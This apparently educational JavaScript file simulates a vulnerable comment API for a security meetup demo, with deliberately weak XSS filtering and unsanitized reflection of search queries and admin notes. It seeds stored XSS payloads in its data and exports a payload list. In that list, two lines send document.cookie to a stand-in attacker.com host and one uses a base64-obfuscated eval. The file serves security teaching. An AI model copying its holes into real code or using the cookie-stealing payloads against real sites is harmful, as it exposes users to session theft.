// Simulated backend for comment storage
// In a real application, this would be a proper API endpoint
// This file demonstrates server-side XSS vulnerabilities

let comments = [
  {
    id: 1,
    username: "admin",
    content: "Welcome to the MSUG comment system! Share your security insights.",
    timestamp: "2024-01-15 10:30:00",
    approved: true
  },
  {
    id: 2,
    username: "security_researcher",
    content: "Great meetup last month! Looking forward to the next one.",
    timestamp: "2024-01-16 14:22:00",
    approved: true
  },
  {
    id: 3,
    username: "pentester",
    content: "<script>alert('Server-side stored XSS - bypassed filtering!')</script>",
    timestamp: "2024-01-17 09:15:00",
    approved: false
  },
  {
    id: 4,
    username: "hacker",
    content: "<img src=\"nonexistent.jpg\" onerror=\"alert('Image-based XSS payload')\" />",
    timestamp: "2024-01-17 11:30:00",
    approved: false
  }
]

// VULNERABILITY: Inadequate XSS filtering function
function sanitizeInput(input) {
  // This is an intentionally weak sanitization function
  // that can be easily bypassed - demonstrating common mistakes
  
  if (!input || typeof input !== 'string') {
    return input
  }
  
  // Only remove obvious script tags - easily bypassed
  let sanitized = input.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '[SCRIPT BLOCKED]')
  
  // Remove some event handlers but not all - incomplete filtering
  sanitized = sanitized.replace(/on\w+\s*=/gi, 'data-blocked=')
  
  // Allow most HTML tags through - major vulnerability
  return sanitized
}

// VULNERABILITY: Insecure comment validation
function validateComment(comment) {
  const errors = []
  
  if (!comment.username || comment.username.trim().length === 0) {
    errors.push('Username is required')
  }
  
  if (!comment.content || comment.content.trim().length === 0) {
    errors.push('Comment content is required')
  }
  
  // VULNERABILITY: No validation of HTML content or dangerous patterns
  if (comment.content && comment.content.length > 1000) {
    errors.push('Comment too long')
  }
  
  return {
    isValid: errors.length === 0,
    errors: errors
  }
}

// API simulation functions
export const commentsAPI = {
  // Get all comments (including unfiltered ones)
  getAllComments: () => {
    return Promise.resolve({
      success: true,
      data: comments,
      message: 'Comments retrieved successfully'
    })
  },

  // Get approved comments only (but still vulnerable)
  getApprovedComments: () => {
    return Promise.resolve({
      success: true,
      data: comments.filter(c => c.approved),
      message: 'Approved comments retrieved'
    })
  },

  // Add new comment with inadequate filtering
  addComment: (commentData) => {
    const validation = validateComment(commentData)
    
    if (!validation.isValid) {
      return Promise.resolve({
        success: false,
        errors: validation.errors,
        message: 'Comment validation failed'
      })
    }

    // VULNERABILITY: Apply weak sanitization but still allow XSS
    const newComment = {
      id: Date.now(),
      username: sanitizeInput(commentData.username),
      content: sanitizeInput(commentData.content), // Inadequate sanitization
      timestamp: new Date().toLocaleString(),
      approved: true // Auto-approve for demo - real apps shouldn't do this
    }

    comments.push(newComment)

    return Promise.resolve({
      success: true,
      data: newComment,
      message: 'Comment added successfully'
    })
  },

  // Admin function to get raw unfiltered comments
  getUnfilteredComments: () => {
    return Promise.resolve({
      success: true,
      data: comments.map(c => ({
        ...c,
        rawContent: c.content // Shows original unsanitized content
      })),
      message: 'Raw comments retrieved (admin only)'
    })
  },

  // Search comments with reflected XSS vulnerability
  searchComments: (query) => {
    if (!query || query.trim().length === 0) {
      return Promise.resolve({
        success: false,
        message: 'Search query is required'
      })
    }

    // VULNERABILITY: Search query reflected without sanitization
    const results = comments.filter(comment => 
      comment.content.toLowerCase().includes(query.toLowerCase()) ||
      comment.username.toLowerCase().includes(query.toLowerCase())
    )

    return Promise.resolve({
      success: true,
      data: results,
      query: query, // VULNERABILITY: Unsanitized query reflection
      message: `Found ${results.length} comments matching "${query}"`
    })
  },

  // Delete comment (admin function with potential XSS in response)
  deleteComment: (commentId, adminNote) => {
    const index = comments.findIndex(c => c.id === commentId)
    
    if (index === -1) {
      return Promise.resolve({
        success: false,
        message: 'Comment not found'
      })
    }

    const deletedComment = comments.splice(index, 1)[0]

    return Promise.resolve({
      success: true,
      data: deletedComment,
      // VULNERABILITY: Admin note reflected without sanitization
      message: `Comment deleted successfully. Admin note: ${adminNote || 'No note provided'}`
    })
  }
}

// Export individual functions for easier testing
export const {
  getAllComments,
  getApprovedComments,
  addComment,
  getUnfilteredComments,
  searchComments,
  deleteComment
} = commentsAPI

// Utility function to reset comments to initial state
export const resetComments = () => {
  comments = [
    {
      id: 1,
      username: "admin",
      content: "Welcome to the MSUG comment system! Share your security insights.",
      timestamp: "2024-01-15 10:30:00",
      approved: true
    },
    {
      id: 2,
      username: "security_researcher", 
      content: "Great meetup last month! Looking forward to the next one.",
      timestamp: "2024-01-16 14:22:00",
      approved: true
    }
  ]
  
  return Promise.resolve({
    success: true,
    message: 'Comments reset to initial state'
  })
}

// XSS test payloads for demonstration
export const xssTestPayloads = [
  '<script>alert("Basic XSS")</script>',
  '<img src="x" onerror="alert(\'Image XSS\')">',
  '<svg onload="alert(\'SVG XSS\')"></svg>',
  '<iframe src="javascript:alert(\'Iframe XSS\')"></iframe>',
  '<body onload="alert(\'Body XSS\')">',
  '<div onclick="alert(\'Click XSS\')">Click me</div>',
  '<script>document.location="http://attacker.com/cookie="+document.cookie</script>',
  '<img src="x" onerror="fetch(\'http://attacker.com/steal?cookie=\' + document.cookie)">',
  '"><script>alert(String.fromCharCode(88,83,83))</script>',
  '<script>eval(atob("YWxlcnQoJ0Jhc2U2NCBYU1MnKQ=="))</script>'
]